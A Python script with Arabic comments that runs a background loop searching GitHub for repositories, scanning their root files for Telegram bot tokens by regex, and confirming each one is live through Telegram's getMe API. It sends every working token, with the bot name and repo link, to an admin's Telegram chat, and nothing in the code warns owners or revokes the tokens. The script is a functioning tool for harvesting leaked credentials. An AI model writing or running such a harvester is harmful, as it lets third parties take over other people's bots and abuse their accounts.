import asyncio
import aiohttp
import re
import os
import logging
from github import Github, RateLimitExceededException

# إعداد السجلات (Logs)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# إعدادات الاتصال
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)
scanned_repos = set()

async def validate_token(session, token):
    """التحقق من صحة التوكن بشكل غير متزامن"""
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        async with session.get(url, timeout=5) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data.get("result", {}).get("username", "Unknown")
    except Exception:
        pass
    return None

async def run_scanner(bot):
    """المحرك الرئيسي للفحص (Background Loop)"""
    logger.info("Scanner Engine: Initialized.")
    
    while True:
        try:
            # التحقق من رصيد API
            remaining = g.get_rate_limit().search.remaining
            if remaining < 10:
                logger.warning("GitHub API Limit low. Sleeping for 1 hour.")
                await asyncio.sleep(3600)
                continue

            # البحث عن مستودعات نشطة
            logger.info("Searching for new repositories...")
            repositories = g.search_repositories(query="telegram bot token", sort="updated")[:20]
            
            async with aiohttp.ClientSession() as session:
                for repo in repositories:
                    if repo.full_name in scanned_repos or repo.stargazers_count < 10:
                        continue
                    
                    scanned_repos.add(repo.full_name)
                    logger.info(f"Scanning: {repo.full_name}")
                    
                    try:
                        contents = repo.get_contents("")
                        for content in contents:
                            # فلترة الملفات
                            if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json')):
                                file_content = content.decoded_content.decode('utf-8', errors='ignore')
                                # Regex قوي للتوكنات
                                tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                                
                                for token in set(tokens):
                                    username = await validate_token(session, token)
                                    if username:
                                        msg = f"✅ **New Token Found!**\n\n🔹 **Bot Username:** @{username}\n🔹 **Repo:** {repo.html_url}\n🔹 **Token:** `{token}`"
                                        await bot.send_message(chat_id=os.getenv("ADMIN_ID"), text=msg, parse_mode='Markdown')
                                        logger.info(f"Valid token found in {repo.full_name}")
                    
                    except Exception as e:
                        logger.error(f"Error scanning {repo.full_name}: {e}")
                        continue
            
            # فترة راحة بين دورات البحث
            await asyncio.sleep(600) 

        except RateLimitExceededException:
            logger.critical("GitHub Rate limit exceeded! Sleeping...")
            await asyncio.sleep(3600)
        except Exception as e:
            logger.error(f"Scanner Critical Error: {e}")
            await asyncio.sleep(60)
